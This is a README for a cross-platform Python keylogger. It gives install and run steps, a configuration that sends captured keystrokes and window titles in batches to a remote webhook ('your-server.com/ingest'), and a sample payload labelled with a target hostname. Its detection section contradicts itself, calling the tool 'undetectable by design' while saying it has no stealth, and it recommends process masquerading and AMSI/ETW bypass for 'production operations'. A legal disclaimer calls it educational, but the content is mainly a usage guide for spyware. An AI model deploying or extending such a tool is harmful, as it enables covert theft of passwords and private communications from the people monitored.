# Keylogger — Keystroke Capture Tool

> **⚠️ IMPORTANT LEGAL NOTICE**
>
> This software is designed **exclusively for authorized security testing, educational purposes, and penetration testing engagements** where explicit written permission has been obtained. Unauthorized use of keyloggers to monitor individuals without their consent is **illegal** in most jurisdictions and violates privacy laws including but not limited to the Computer Fraud and Abuse Act (CFAA), GDPR, and similar regulations worldwide.
>
> **You are responsible for ensuring compliance with all applicable laws.** The author assumes no liability for misuse.

---

## Overview

A cross-platform educational keylogger that demonstrates:

- Keyboard event capture via `pynput`
- Active window title tracking across Windows, macOS, and Linux
- Timestamped log writing with automatic size-based rotation
- Batched HTTP delivery (webhook) for remote event shipping
- Runtime logging toggle via a configurable hotkey

This project is intended as a **reference implementation** for understanding how keystroke capture works at the OS level — useful for red team training, detection engineering, and security research.

---

## Features

| Feature | Details |
|---|---|
| **Keystroke Capture** | Captures character keys, special keys (Enter, Tab, arrows, etc.), and unknown inputs via `pynput` listener |
| **Window Tracking** | Resolves the active window title — uses `win32gui` (Windows), `NSWorkspace` (macOS), or `xdotool` (Linux) |
| **File Logging** | Writes human-readable timestamped logs with optional window context; auto-rotates at configurable size |
| **Webhook Delivery** | Buffers events and POSTs batches to a configurable endpoint (JSON); requires `requests` |
| **Toggle Key** | Press a hotkey (default: F9) to pause/resume logging at runtime without stopping the process |
| **Graceful Shutdown** | Flushes buffers, closes files, stops the listener cleanly on Ctrl+C |

---

## Requirements

- **Python 3.10+** (uses `str \| None` syntax, `dataclass`, `pathlib`)
- **pynput** — keyboard listener backend

### Optional Dependencies

| Dependency | Purpose | Platform |
|---|---|---|
| `pywin32`, `psutil` | Active window title resolution | Windows |
| `pyobjc` (AppKit) | Active window title resolution | macOS |
| `xdotool` | Active window title resolution | Linux |
| `requests` | Webhook HTTP delivery | All |

---

## Installation

```bash
# Clone the repository
git clone https://github.com/karthikgk1001/keylogger.git
cd keylogger

# Install core dependency
pip install pynput

# Install optional dependencies based on your use case
pip install requests          # For webhook delivery
pip install pywin32 psutil    # Windows window tracking
pip install pyobjc            # macOS window tracking
sudo apt install xdotool      # Linux window tracking (Debian/Ubuntu)
```

---

## Quick Start

Run with default configuration:

```bash
python keyloggerfinal.py
```

Default behavior:
- Logs directory: `~/.keylogger_logs/`
- Log file prefix: `keylog_YYYYMMDD_HHMMSS_ffffff.txt`
- Max log size: 5 MB (auto-rotates)
- Toggle key: **F9** (press to pause/resume logging)
- Window tracking: enabled
- Webhook: disabled (no URL configured)

---

## Configuration

Modify `KeyloggerConfig` before instantiation in `main()` — or pass a custom config object:

```python
from pathlib import Path
from pynput.keyboard import Key

config = KeyloggerConfig(
    log_dir=Path.home() / ".custom_logs",
    log_file_prefix="capture",
    max_log_size_mb=10.0,
    webhook_url="https://your-server.com/ingest",
    webhook_batch_size=25,
    toggle_key=Key.f10,
    enable_window_tracking=True,
    log_special_keys=False,
)

keylogger = Keylogger(config)
keylogger.start()
```

| Parameter | Type | Default | Description |
|---|---|---|---|
| `log_dir` | `Path` | `~/.keylogger_logs` | Directory for log files |
| `log_file_prefix` | `str` | `"keylog"` | Prefix for rotated log filenames |
| `max_log_size_mb` | `float` | `5.0` | Max log file size before rotation |
| `webhook_url` | `str \| None` | `None` | HTTP endpoint for batched event delivery |
| `webhook_batch_size` | `int` | `50` | Events per webhook POST |
| `toggle_key` | `Key` | `Key.f9` | Hotkey to pause/resume logging |
| `enable_window_tracking` | `bool` | `True` | Whether to resolve active window titles |
| `log_special_keys` | `bool` | `True` | Whether to log Shift, Ctrl, Alt, etc. |

---

## Log Format

Each log line follows this structure:

```
[2026-06-20 14:30:01] [firefox - Mozilla Firefox] h
[2026-06-20 14:30:01] [firefox - Mozilla Firefox] e
[2026-06-20 14:30:01] [firefox - Mozilla Firefox] l
[2026-06-20 14:30:01] [firefox - Mozilla Firefox] l
[2026-06-20 14:30:01] [firefox - Mozilla Firefox] o
[2026-06-20 14:30:02] [firefox - Mozilla Firefox] [SPACE]
[2026-06-20 14:30:02] [firefox - Mozilla Firefox] w
[2026-06-20 14:30:02] [firefox - Mozilla Firefox] o
[2026-06-20 14:30:02] [firefox - Mozilla Firefox] r
[2026-06-20 14:30:02] [firefox - Mozilla Firefox] l
[2026-06-20 14:30:02] [firefox - Mozilla Firefox] d
[2026-06-20 14:30:03] [firefox - Mozilla Firefox] [ENTER]
```

---

## Webhook Payload

Example POST body sent to `webhook_url`:

```json
{
  "timestamp": "2026-06-20T14:30:05.123456",
  "host": "target-hostname",
  "events": [
    {
      "timestamp": "2026-06-20T14:30:01.000000",
      "key": "h",
      "window_title": "firefox - Mozilla Firefox",
      "key_type": "char"
    },
    {
      "timestamp": "2026-06-20T14:30:03.000000",
      "key": "[ENTER]",
      "window_title": "firefox - Mozilla Firefox",
      "key_type": "special"
    }
  ]
}
```

---

## Project Structure

```
keyloggerfinal.py           # Single-file implementation with all classes
├── KeyloggerConfig    # Dataclass — all runtime settings
├── KeyEvent           # Dataclass — single keystroke record
├── KeyType            # Enum — CHAR, SPECIAL, UNKNOWN
├── SPECIAL_KEYS       # Dict — pynput Key -> display label
├── WindowTracker      # Static — OS-specific active window resolution
├── LogManager         # File I/O — size-based rotation with thread safety
├── WebhookDelivery    # HTTP — buffered batch POST delivery
└── Keylogger          # Orchestrator — listener, logging, lifecycle
```

---

## Class Reference

### `KeyloggerConfig`
Dataclass holding all runtime configuration. No side effects on construction — directory creation is deferred to `LogManager`.

### `KeyEvent`
Single keystroke record. Provides `to_dict()` (JSON serialization) and `to_log_string()` (human-readable format).

### `LogManager`
Thread-safe file writer. Creates the log directory if absent. Rotates the output file when the size threshold is exceeded. Must be explicitly closed.

### `WebhookDelivery`
Batched HTTP delivery. Releases the buffer lock before the POST call to avoid blocking the listener. Flush remaining events on shutdown.

### `WindowTracker`
Static method `get_active_window()` returns the current foreground window title. Platform-specific implementations are selected at runtime.

### `Keylogger`
Top-level orchestrator. Instantiates all components, runs the `pynput` listener, handles the toggle hotkey, and manages graceful shutdown.

---

## Detection Considerations

This implementation is intentionally **undetectable by design** — there is no stealth mechanism, no process hiding, no persistence. It is meant for:

- **Research** — understanding keylogger internals
- **Detection engineering** — developing signatures for EDR/XDR
- **Training** — red/blue team exercises in controlled environments
- **Code review** — studying clean Python patterns for I/O, threading, and platform abstraction

For production operations, consider:
- Adding process masquerading / AMSI/ETW bypass (Windows)
- Using beaconing instead of inline HTTP
- Encrypting log files at rest

---

## Limitations

- No rootkit / kernel-level capture — runs at user-space privilege
- No screenshot or clipboard capture (intentionally scoped)
- Window tracking polling interval (0.5s) may miss rapid tab switches
- Webhook delivery is fire-and-forget — no retry logic in this version
- `xdotool` on Linux requires an X11 session (no Wayland support)

---


## Author

**Karthik** — 2026

*This project is provided for educational and authorized security testing purposes only.*
